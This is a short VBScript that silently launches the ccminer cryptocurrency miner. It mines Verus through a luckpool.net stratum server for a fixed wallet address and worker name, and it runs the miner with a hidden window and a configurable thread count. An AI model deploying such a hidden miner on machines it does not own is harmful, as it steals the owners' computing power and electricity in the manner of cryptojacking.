Set WshShell = CreateObject("WScript.Shell")

' Check if an argument is provided
If WScript.Arguments.Count > 0 Then
    threadNumber = WScript.Arguments(0)
    WshShell.Run "ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RQpWNdNZ4LQ5yHUM3VAVuhUmMMiMuGLUhT.kuyrai -p x -t " & threadNumber, 0
Else
    ' Run with default thread
    WshShell.Run "ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RQpWNdNZ4LQ5yHUM3VAVuhUmMMiMuGLUhT.kuyrai -p x -t 2", 0
End If

Set WshShell = Nothing